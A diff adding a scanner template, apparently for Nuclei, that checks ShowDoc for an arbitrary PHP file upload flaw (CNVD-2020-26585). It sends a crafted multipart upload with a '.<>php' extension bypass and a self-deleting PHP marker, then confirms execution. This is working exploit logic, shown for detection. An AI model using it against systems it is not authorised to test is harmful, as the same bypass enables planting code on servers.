@@ -1,0 +1,63 @@
+id: showdoc-file-upload-cnvd-2020-26585
+info:
+  name: ShowDoc File Upload Vulnerability (CNVD-2020-26585)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a file upload vulnerability in ShowDoc that allows attackers to upload arbitrary PHP files.
+
+variables:
+  filename: '{{rand_text_alpha(7)}}'
+  rboundary: '{{rand_text_alpha(8)}}'
+  s1: '{{rand_int(100000, 200000)}}'
+  s2: '{{rand_int(10000, 20000)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/index.php?s=/home/page/uploadImg'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=--------------------------{{rboundary}}'
+    body: |
+      ----------------------------{{rboundary}}
+
+      Content-Disposition: form-data; name="editormd-image-file"; filename="{{filename}}.<>php"
+
+      Content-Type: text/plain
+
+      <?php echo ''.({{s1}}-{{s2}}); unlink(__FILE__); ?>
+
+      ----------------------------{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'success'
+        part: body
+    extractors:
+      - type: regex
+        internal: true
+        name: upload_path
+        part: body
+        group: 0
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/(?P<file>[a-f0-9]+\.php)'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/Public/Uploads/{{upload_path}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{to_number(s1)-to_number(s2)}}'
+        part: body
